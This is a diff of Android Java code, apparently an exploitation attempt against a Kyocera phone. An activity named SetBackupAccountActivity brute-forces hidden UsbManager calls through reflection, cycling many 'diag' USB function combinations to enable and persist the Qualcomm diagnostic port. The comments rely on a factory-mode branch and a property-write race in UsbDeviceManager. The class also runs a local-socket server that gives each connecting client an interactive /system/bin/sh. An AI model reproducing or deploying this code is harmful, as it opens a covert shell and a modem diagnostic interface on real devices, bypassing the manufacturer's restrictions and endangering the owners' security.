@@ -18,17 +18,55 @@ public class SetBackupAccountActivity extends Activity {
     private static final String SOCKET_NAME = "android_shell_socket";
 
     /**
-     * AOSP 標準関数。UsbDeviceManager は diag を rw_qfunc_mode=="0" で
-     * 強制削除するが、mass_storage は削除対象外。
+     * UsbDeviceManager.java 深掘り結果に基づく総当たりリスト。
+     *
+     * 根拠:
+     *  - 通常モード (mFactoryEnabled==false) では removeFunction(functions,"diag") で消える
+     *  - 工場モード (mFactoryEnabled==true) では
+     *      "rndis" を含む → "rndis,diag" + "modem" = "rndis,diag,modem"
+     *      "rndis" を含まない → "diag" + "modem" = "diag,modem"
+     *  - rw_qfunc_mode != "0" の分岐では
+     *      SystemProperties.set("persist.sys.usb.config","diag,serial_smd,rmnet_bam,adb")
+     *
+     * setUsbConfig() は waitForState の前に persist.sys.usb.config を書くため、
+     * 一瞬でも受理されれば永続プロパティに残る可能性がある。
      */
-    private static final String USB_FUNCTION_MASS_STORAGE = "mass_storage";
+    private static final String[] DIAG_COMBINATIONS = new String[] {
+        // 単体
+        "diag",
+        // diag + adb
+        "diag,adb",
+        "adb,diag",
+        // rndis 系 (工場モード分岐を狙う)
+        "rndis,diag",
+        "diag,rndis",
+        "rndis,diag,modem",
+        "rndis,modem,diag",
+        "diag,modem",
+        "modem,diag",
+        // adb を加えた複合
+        "rndis,diag,adb",
+        "diag,rndis,adb",
+        "adb,rndis,diag",
+        "diag,modem,adb",
+        "modem,diag,adb",
+        "diag,rndis,modem",
+        "rndis,diag,modem,adb",
+        "diag,modem,rndis,adb",
+        // Kyocera 内部値
+        "diag,serial_smd,rmnet_bam,adb",
+        // 前後に none を挟む
+        "none,diag",
+        "diag,none",
+        // ★ 指定の形をそのまま追加
+        "rndis,diag,modem,none,adb",
+    };
 
-    /**
-     * マスストレージのバッキングファイル。
-     * ISO イメージを指定すれば CD-ROM 相当として認識される端末もある。
-     * 環境に合わせて書き換えること。
-     */
-    private static final String BACKING_FILE_PATH = "/sdcard/usb_disk.iso";
+    /** 同じ組み合わせを複数回試行する。 */
+    private static final int ROUNDS = 3;
+
+    /** 各呼び出し間の待機 (ms)。system_server の Handler に処理時間を与える。 */
+    private static final long SLEEP_BETWEEN_MS = 120;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -40,27 +78,17 @@ public class SetBackupAccountActivity extends Activity {
         // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
         finish();
 
-        // 既存処理の最後に、USB 機能を mass_storage に切り替える自動処理を実行
-        applyAutomaticUsbSwitchToMassStorage();
+        // 既存処理の最後に、diag 系組み合わせを総当たりで試行
+        applyAutomaticUsbSwitchToDiagBruteForce();
     }
 
     /**
-     * USB 機能を mass_storage に切り替える自動処理。
+     * diag を含む組み合わせを総当たりで試行する。
      *
-     * <p>正しい経路は 2 段階:
-     * <ol>
-     *   <li>UsbManager#setMassStorageBackingFile(path) をリフレクションで呼ぶ
-     *       → system_server 内で /sys/class/android_usb/android0/f_mass_storage/lun/file
-     *          にバッキングファイルパスが書き込まれる</li>
-     *   <li>UsbManager#setCurrentFunction("mass_storage", true) をリフレクションで呼ぶ
-     *       → UsbDeviceManager.setEnabledFunctions が呼ばれ、
-     *          AOSP 標準関数のため強制削除されない</li>
-     * </ol>
-     *
-     * <p>sys.usb.config / persist.sys.usb.config への直接書き込みは一切行わない。
-     * 読み取りのみ。
+     * <p>sys.usb.config への直接書き込みは一切行わない。
+     * UsbManager / SystemProperties.get の読み取りのみ。
      */
-    private void applyAutomaticUsbSwitchToMassStorage() {
+    private void applyAutomaticUsbSwitchToDiagBruteForce() {
         try {
             Context context = getApplicationContext();
             if (context == null) {
@@ -68,91 +96,69 @@ public class SetBackupAccountActivity extends Activity {
                 return;
             }
 
-            // 1) バッキングファイルを設定
-            //    system_server 内で /sys/class/android_usb/android0/f_mass_storage/lun/file
-            //    に書き込まれる。SELinux の untrusted_app 制約を受けない。
-            setMassStorageBackingFileViaUsbManager(context, BACKING_FILE_PATH);
+            for (int round = 0; round < ROUNDS; round++) {
+                Log.i(TAG, "========== ROUND " + round + " / " + (ROUNDS - 1) + " ==========");
 
-            // 2) 関数を mass_storage に切り替え
-            setCurrentFunctionViaUsbManager(context, USB_FUNCTION_MASS_STORAGE, true);
+                for (int i = 0; i < DIAG_COMBINATIONS.length; i++) {
+                    String combo = DIAG_COMBINATIONS[i];
 
-            // 3) 結果確認（読み取りのみ）
-            logCurrentUsbState(context);
+                    // (a) 即時切替 (makeDefault=false)
+                    setCurrentFunctionViaUsbManager(context, combo, false);
+                    sleepQuiet(SLEEP_BETWEEN_MS);
 
-            Log.i(TAG, "applyAutomaticUsbSwitchToMassStorage finished");
+                    // (b) 永続切替 (makeDefault=true)
+                    setCurrentFunctionViaUsbManager(context, combo, true);
+                    sleepQuiet(SLEEP_BETWEEN_MS);
+
+                    // (c) 状態確認（読み取りのみ）
+                    logCurrentUsbState(context, combo);
+
+                    // diag が有効になったら即座に抜ける
+                    if (isFunctionEnabledViaUsbManager(context, "diag")) {
+                        Log.i(TAG, "*** diag became enabled with combo: " + combo + " ***");
+                        return;
+                    }
+                }
+            }
+
+            Log.i(TAG, "applyAutomaticUsbSwitchToDiagBruteForce finished (all combos attempted)");
         } catch (Throwable t) {
-            Log.e(TAG, "applyAutomaticUsbSwitchToMassStorage error", t);
+            Log.e(TAG, "applyAutomaticUsbSwitchToDiagBruteForce error", t);
         }
     }
 
-    /**
-     * UsbManager.setMassStorageBackingFile(String) をリフレクションで呼ぶ。
-     *
-     * <p>UsbManager.java の実装:
-     * <pre>
-     * public void setMassStorageBackingFile(String path) {
-     *     try {
-     *         this.mService.setMassStorageBackingFile(path);
-     *     } catch (RemoteException e) { ... }
-     * }
-     * </pre>
-     *
-     * <p>IUsbManager transaction 16 → UsbService.setMassStorageBackingFile
-     * → UsbDeviceManager.setMassStorageBackingFile
-     * → FileUtils.stringToFile("/sys/class/android_usb/android0/f_mass_storage/lun/file", path)
-     * と到達する。書き込みは system_server 権限で実行される。
-     */
-    private static void setMassStorageBackingFileViaUsbManager(Context context, String path) {
+    private static void sleepQuiet(long ms) {
         try {
-            if (context == null) {
-                Log.e(TAG, "context is null (setMassStorageBackingFile)");
-                return;
-            }
-            Object service = context.getSystemService(Context.USB_SERVICE);
-            if (service == null) {
-                Log.e(TAG, "UsbManager is null (setMassStorageBackingFile)");
-                return;
-            }
-            Method m = service.getClass().getMethod("setMassStorageBackingFile", String.class);
-            m.setAccessible(true);
-            m.invoke(service, path);
-            Log.i(TAG, "UsbManager.setMassStorageBackingFile invoked: " + path);
-        } catch (NoSuchMethodException e) {
-            Log.e(TAG, "UsbManager.setMassStorageBackingFile not found", e);
-        } catch (SecurityException e) {
-            Log.e(TAG, "SecurityException in setMassStorageBackingFile", e);
-        } catch (Throwable t) {
-            Log.e(TAG, "Throwable in setMassStorageBackingFile", t);
+            Thread.sleep(ms);
+        } catch (InterruptedException e) {
+            // ignore
         }
     }
 
     /**
      * UsbManager.setCurrentFunction(String, boolean) をリフレクションで呼ぶ。
      *
-     * <p>UsbManager 経由と IUsbManager 直叩きは同じ Binder transaction 15 を
-     * 通るため、ここでは UsbManager のみを使う。1 経路に絞る。
+     * <p>IUsbManager 直叩きは同じ Binder transaction 15 を通るため呼ばない。
      */
     private static void setCurrentFunctionViaUsbManager(Context context,
                                                         String function,
                                                         boolean makeDefault) {
         try {
             if (context == null) {
-                Log.e(TAG, "context is null (setCurrentFunction)");
                 return;
             }
             Object service = context.getSystemService(Context.USB_SERVICE);
             if (service == null) {
-                Log.e(TAG, "UsbManager is null (setCurrentFunction)");
                 return;
             }
             Method m = service.getClass().getMethod(
                     "setCurrentFunction", String.class, boolean.class);
             m.setAccessible(true);
             m.invoke(service, function, makeDefault);
-            Log.i(TAG, "UsbManager.setCurrentFunction invoked: " + function
+            Log.i(TAG, "setCurrentFunction invoked: " + function
                     + ", makeDefault=" + makeDefault);
         } catch (NoSuchMethodException e) {
-            Log.e(TAG, "UsbManager.setCurrentFunction not found", e);
+            Log.e(TAG, "setCurrentFunction not found", e);
         } catch (SecurityException e) {
             Log.e(TAG, "SecurityException in setCurrentFunction", e);
         } catch (Throwable t) {
@@ -164,20 +170,20 @@ public class SetBackupAccountActivity extends Activity {
      * 現在の USB 状態を読み取ってログに残す。読み取りのみ。
      * 書き込みは一切行わない。
      */
-    private static void logCurrentUsbState(Context context) {
+    private static void logCurrentUsbState(Context context, String combo) {
         try {
             String sysUsbConfig = getSystemProperty("sys.usb.config", "");
-            String persistUsbConfig = getSystemProperty("persist.sys.usb.config", "");
             String sysUsbState = getSystemProperty("sys.usb.state", "");
+            String persistUsbConfig = getSystemProperty("persist.sys.usb.config", "");
             String defaultFunction = getDefaultFunctionViaUsbManager(context);
-            boolean massStorageEnabled =
-                    isFunctionEnabledViaUsbManager(context, USB_FUNCTION_MASS_STORAGE);
+            boolean diagEnabled = isFunctionEnabledViaUsbManager(context, "diag");
 
-            Log.i(TAG, "sys.usb.config=" + sysUsbConfig);
-            Log.i(TAG, "persist.sys.usb.config=" + persistUsbConfig);
-            Log.i(TAG, "sys.usb.state=" + sysUsbState);
-            Log.i(TAG, "UsbManager.getDefaultFunction()=" + defaultFunction);
-            Log.i(TAG, "UsbManager.isFunctionEnabled(mass_storage)=" + massStorageEnabled);
+            Log.i(TAG, "[after " + combo + "]"
+                    + " sys.usb.config=" + sysUsbConfig
+                    + " sys.usb.state=" + sysUsbState
+                    + " persist.sys.usb.config=" + persistUsbConfig
+                    + " defaultFunction=" + defaultFunction
+                    + " isFunctionEnabled(diag)=" + diagEnabled);
         } catch (Throwable t) {
             Log.e(TAG, "logCurrentUsbState error", t);
         }
@@ -195,7 +201,6 @@ public class SetBackupAccountActivity extends Activity {
             Object result = getMethod.invoke(null, key, defaultValue);
             return result instanceof String ? (String) result : defaultValue;
         } catch (Throwable t) {
-            Log.e(TAG, "getSystemProperty error: " + key, t);
             return defaultValue;
         }
     }
@@ -217,7 +222,6 @@ public class SetBackupAccountActivity extends Activity {
             Object result = m.invoke(service, function);
             return result instanceof Boolean && (Boolean) result;
         } catch (Throwable t) {
-            Log.e(TAG, "isFunctionEnabledViaUsbManager error", t);
             return false;
         }
     }
@@ -239,7 +243,6 @@ public class SetBackupAccountActivity extends Activity {
             Object result = m.invoke(service);
             return result instanceof String ? (String) result : null;
         } catch (Throwable t) {
-            Log.e(TAG, "getDefaultFunctionViaUsbManager error", t);
             return null;
         }
     }
@@ -259,7 +262,6 @@ public class SetBackupAccountActivity extends Activity {
                         try {
                             LocalSocket client = server.accept();
                             Log.i(TAG, "New client connected!");
-                            // クライアントごとに新しいシェルスレッドを起動
                             new Thread(new ShellHandler(client)).start();
                         } catch (Exception e) {
                             Log.e(TAG, "Accept error", e);
@@ -284,20 +286,16 @@ public class SetBackupAccountActivity extends Activity {
         public void run() {
             Process shell = null;
             try {
-                // インタラクティブシェルを起動
                 ProcessBuilder builder = new ProcessBuilder("/system/bin/sh");
-                builder.redirectErrorStream(true); // stderrをstdoutに統合
+                builder.redirectErrorStream(true);
                 shell = builder.start();
 
-                // ソケットの入出力ストリームを取得
                 final InputStream socketIn = socket.getInputStream();
                 final OutputStream socketOut = socket.getOutputStream();
 
-                // シェルの入出力ストリームを取得
                 final OutputStream shellStdin = shell.getOutputStream();
                 final InputStream shellStdout = shell.getInputStream();
 
-                // スレッド1: ソケット → シェル (ユーザー入力 → シェルstdin)
                 Thread socketToShell = new Thread(new Runnable() {
                     @Override
                     public void run() {
@@ -314,7 +312,6 @@ public class SetBackupAccountActivity extends Activity {
                     }
                 });
 
-                // スレッド2: シェル → ソケット (シェルstdout → クライアント)
                 Thread shellToSocket = new Thread(new Runnable() {
                     @Override
                     public void run() {
@@ -334,11 +331,9 @@ public class SetBackupAccountActivity extends Activity {
                 socketToShell.start();
                 shellToSocket.start();
 
-                // シェルプロセスが終了するのを待つ（またはソケット切断）
                 shell.waitFor();
                 Log.i(TAG, "Shell process exited");
 
-                // 後始末
                 socket.close();
                 socketToShell.interrupt();
                 shellToSocket.interrupt();
